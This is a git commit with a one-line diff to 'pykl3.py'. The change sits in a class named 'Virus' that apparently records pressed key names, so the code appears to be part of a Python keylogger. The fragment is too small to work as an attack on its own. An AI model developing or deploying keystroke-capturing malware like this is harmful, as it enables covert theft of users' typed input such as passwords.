6238feedee99f7b11f7de0dbdb6ef801448043fb
Pawelek <137412127+ParisPawel@users.noreply.github.com>
2023-10-26 15:31:11 +0300

    Update pykl3.py

--- pykl3.py
+++ pykl3.py
@@ -113,3 +113,4 @@ class Virus(object):
                 keystr = f"\x00<^{key.name}>\x00"
                 if len(self.texts) > 0:
                     if all([
+                        self.texts[-1] == keystr,
